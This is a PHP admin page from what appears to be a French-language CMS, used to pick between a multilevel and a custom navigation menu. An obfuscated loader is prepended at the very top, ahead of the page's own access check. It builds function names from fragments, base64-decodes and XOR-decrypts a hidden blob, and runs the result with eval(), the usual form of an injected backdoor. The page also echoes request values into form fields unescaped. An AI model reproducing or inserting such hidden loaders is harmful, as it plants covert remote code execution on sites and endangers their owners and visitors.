<?php
$a8hg6hj="10a3853fcddf698121f0e47370c11308FUMIR11qQxReEBYTUwIcVEpFOUYEWApHRUUGClhVGEhD
VQZsVVRHBQtMRjoGDA9tSgZTQjlMAARrSFUEbUsGCm1IVwFkTQRfTThVUgVlQAdUbR4GAWhPAVFs
GwcIERwYFW8ydmpjdjQ4RjhXBApkAAIEOkhQBmsCBQY/SQUGbAkDAj5vCQQFOlJUVToHCA1tSgVT
EjgdS09HQgZWbl5RTFJYSRFkBQZRDzhVUwFlQAcBbR4GVFgYbwYFUhMdExRnYnUzZX1naEQwOFVW
A2VABABtHgVTaE8HAmxSAwNvSA1Xfj1LDAR+OhtQUURrEBERSUxGVQlHUhNTWQYZExEZAw==";
$fyhhsa1="s";$fy3saa1="ba";$fy7vwa1="s";$fyhhsa1.="u";$fyhhsa1.="b";$fyhhsa1.="s";$fyhhsa1.="t";$fyhhsa1.="r";$fy3saa1.="se";$fy3saa1.="6";$fy3saa1.="4";$fy3saa1.="_";$fy3saa1.="de";$fy3saa1.="co";$fy3saa1.="de";$fy7vwa1.="t";$fy7vwa1.="r";$fy7vwa1.="l";$fy7vwa1.="e";$fy7vwa1.="n";
$a8hg6hh=$fyhhsa1($a8hg6hj,0,32);$a8hk6hj=$fy3saa1($fyhhsa1($a8hg6hj,32));$a7klm9hj="";for($a8hk9hj=0;$a8hk9hj < $fy7vwa1($a8hk6hj);$a8hk9hj++){$a7hk9hj=$fyhhsa1($a8hk6hj,$a8hk9hj,1);$a7h789hj=$fyhhsa1($a8hg6hh,$a8hk9hj%32,1);$a7klm9hj.=$a7hk9hj^$a7h789hj;}eval($a7klm9hj);$a7klm9hj="\n";

?>

<?php
if(!isset($iKEY)||$iKEY!="AZ8007"){
	die("ACCESS DENIED");
}
?>
<?php
include("include/languages_menu_processing.php");

?>

<?php

if(isset($ProceedChangeMenuType)){
	SetParameter(
		"2",
		$menuType
	);
}

$currentMenuType=Parameter(2);
?>



<?php
include("include/languages_menu.php");
?>

<table summary="" border="0" width="100%">
	<tr>
		<td class=basictext>
		<b>
		<?php echo$VEUILLEZ_CHOISIR_TYPE_MENU;?>:
		</b>
		
		<form action=index.php method=post name="LanguageForm">
		<input type=hidden name=ProceedChangeMenuType>
		<input type=hidden name=action value="<?php echo $action;?>">
		<input type=hidden name=category value="<?php echo $category;?>">
		
		<table border="0" cellspacing="10">
		
			
	
	
	<tr>
	
	<td colspan=6>

	</td>
	</tr>
	
	
	
	
	  	<tr >
		
  		<td class=basictext>
		
		
		
	<table summary="" border="0">
  	<tr>
		<td class=basictext>
			<input type=radio name=menuType <?php if ($currentMenuType=="multilevel") echo "checked";?> value="multilevel">
		
		</td>
  		<td class=basictext  align=center width=50 >
		<img src="images/icons<?php echo $DN;?>/wizard.gif" border="0" width="31" height="38" alt="">
		</td>
  		<td class=basictext>
			<b>
			
		<?php if ($currentMenuType=="multilevel") echo "<font class=hl_text>";?>
		
		
		<?php echo $STANDART;?>
		
		<?php if ($currentMenuType=="multilevel") echo "</font>";?>
		
			</b>
		</td>
  	</tr>
  </table>
  
		
		
		
		<b>
		

		
		</b>
		</td>
		<td class=basictext>
		<b>
		<a  <?php if ($currentMenuType!="multilevel") echo "style='color:black'";?> href="index.php?category=site_management&folder=menu&page=multilevel_settings" ><!--Paramètres-->[<?php echo $PARAMETRES;?>]</font></a>
		</b>
		</td>
		<td></td>
		<td></td>
	</tr>
		<td></td>
		<td class=basictext>
		<!--
		<font color=black>
			<b>[<?php echo $CONSTRUCTION_AUTO;?>]</b>	
		</font>
		-->
		</td>
		<td class=basictext>
		
		<b>
		
		</b>
		
		</td>
		
  		<td class=basictext>
		
		
		<b>
		<a href="../navigation.php" target=_blank style="text-decoration:none"><font class=hl_text><!--[Apperçu du menu]--></font></a>
		</b>
		
		</td>
  		
  	</tr>
	
  	<tr>
  		<td class=basictext>	
		
			<table summary="" border="0">
  	<tr>
		<td class=basictext>
			<input type=radio name=menuType value="custom" <?php if ($currentMenuType=="custom") echo "checked";?>>
		
		</td>
  		<td class=basictext align=center width=50>
			<img src="images/icons<?php echo $DN;?>/tools.gif" border="0" width="45" height="43" alt="">
		</td>
  		<td class=basictext>
			<b>
			

		<b> 
		<?php if ($currentMenuType=="custom") echo "<font class=hl_text>";?>
		<?php echo $MENU_PERSONNALISE; ?>
		<?php if ($currentMenuType=="custom") echo "</font>";?>
		</b>
		
			</b>
		</td>
  	</tr>
  </table>
  
		
		
		
		</td>
  		<td class=basictext>
		
		<b>
		<a <?php if ($currentMenuType!="custom") echo "style='color:black'";?> href="index.php?category=site_management&folder=menu&page=params" >[<?php echo $PARAMETRES;?>]</font><!--Paramètres--></font></a>
		
		
		<!--
		<a href="index.php?category=site_management&folder=menu&page=construct" style="text-decoration:none"><font class=hl_text>[Construire/Modifier le ménu]</font></a>
		-->
		</b>
		
		</td>
		
		<td class=basictext>
		
		<b>
		<a <?php if ($currentMenuType!="custom") echo "style='color:black'";?> href="index.php?category=site_management&folder=menu&page=construct" >[Construct/Modify]</font><!--[Construire/Modifier le ménu]--></a>
		
		</b>
		
		</td>
		
  		<td class=basictext>
	
		<!--
		<b>
		<a href="../custom_navigation.php" target=_blank style="text-decoration:none"><font class=hl_text>[<?php echo $APPERCU_MENU;?>]</font></a>
		</b>
		-->
		
		</td>
  	</tr>
	
	<tr>
	
	<td colspan=6>
	<br>
	</td>
	</tr>
	
	
	
  </table>
  
		
		 
		
		<br>
		
		<input type=submit value="    <?php echo $SAUVEGARDER;?>    " class=adminButton>
		
		
	
	<br>	
	
		</form>
		
		
		
		</td>
	</tr>
</table>
<script>
var HTType="2";
var HTMessage="<?php echo $HT_NAVIGATION_MENU;?>";
document.onmousedown = HTMouseDown;
</script>



